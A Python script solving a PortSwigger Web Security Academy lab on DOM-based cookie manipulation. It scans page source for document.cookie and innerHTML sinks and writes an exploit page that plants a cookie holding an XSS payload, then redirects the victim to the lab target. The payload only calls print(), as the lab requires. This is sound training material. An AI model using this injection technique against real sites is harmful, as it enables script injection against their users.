"""
Lab 5: DOM-based cookie manipulation
https://portswigger.net/web-security/dom-based/cookie-manipulation/lab-dom-based-cookie-manipulation
Difficulty: Practitioner

📝 The flaw: page JS reads a value out of document.cookie (often something
like a "last viewed product" or analytics tracking cookie) and feeds it into
a sink unsanitized. Since document.cookie is itself attacker-settable from
any page on a related/same context — or directly via document.cookie= on
our exploit page before the victim navigates — we control the sink's input.
"""

from utils import get_session, log, note, fetch_page_source, grep_for_patterns

TARGET = "https://YOUR-LAB-ID.web-security-academy.net"


def build_cookie_poc(cookie_value_payload):
    """
    Sets a cookie for the TARGET's domain (requires same-site delivery, e.g.
    this page itself being on/under that domain via the exploit server path
    trick, or relies on the lab's specific cookie scope) then navigates the
    victim to the vulnerable page so it reads our planted value.
    """
    return f"""<script>
  document.cookie = "lastViewedProduct={cookie_value_payload}; path=/";
  window.location = "{TARGET}/";
</script>"""


def run():
    s = get_session()
    source = fetch_page_source(s, f"{TARGET}/")
    note("Looking for document.cookie reads feeding a sink like innerHTML.")
    grep_for_patterns(source, ["document.cookie", ".innerHTML"])

    payload = "<img src=1 onerror=print()>"
    html = build_cookie_poc(payload)

    out_path = "exploit.html"
    with open(out_path, "w") as f:
        f.write(html)
    log(f"Wrote PoC to {out_path}")
    note("Cookie scope matters — this only works if our exploit-server page")
    note("can set a cookie the target domain's JS will actually read; check")
    note("the lab's specific delivery notes if the planted cookie isn't seen.")


if __name__ == "__main__":
    run()
